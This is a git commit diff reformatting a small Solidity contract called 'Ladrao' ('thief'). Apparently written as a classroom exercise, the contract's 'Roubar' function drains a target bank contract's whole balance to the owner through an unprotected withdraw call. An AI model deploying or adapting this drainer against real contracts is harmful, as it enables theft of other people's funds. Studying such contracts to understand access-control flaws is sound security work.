75c345d6fea2dd13df733ab46f10a256e0b28f96
Mateus Arruda Navarro Albuquerque <mateusnavarro@2ndmarket.com.br>
2022-09-27 14:32:19 -0300

    corrigi Ladrao.sol

--- contracts/Ladrao.sol
+++ contracts/Ladrao.sol
@@ -1,33 +1,29 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.2;
 
-interface Banco {
-    function Sacar(address _to,uint256 _amount) external;
-    function Depositar() external payable ;
+interface Banco_interface {
+    function Sacar(address _to, uint256 _amount) external;
+
+    function Depositar() external payable;
 }
 
 contract Ladrao {
-    address  payable public owner;
+    address payable public owner;
 
-    Banco banco;
+    Banco_interface banco;
 
     constructor(address _endereco_alvo) {
-        banco = Banco(_endereco_alvo);
+        banco = Banco_interface(_endereco_alvo);
         owner = payable(msg.sender);
-    }   
-    function Depositar() public payable{
+    }
+
+    function Depositar() public payable {
         return banco.Depositar();
     }
 
-
-    function Roubar() public   {
-            if(address(banco).balance>0){
-                banco.Sacar(owner,address(banco).balance);
-
-            }
-            
-
-            
+    function Roubar() public {
+        if (address(banco).balance > 0) {
+            banco.Sacar(owner, address(banco).balance);
+        }
     }
-
-
+}
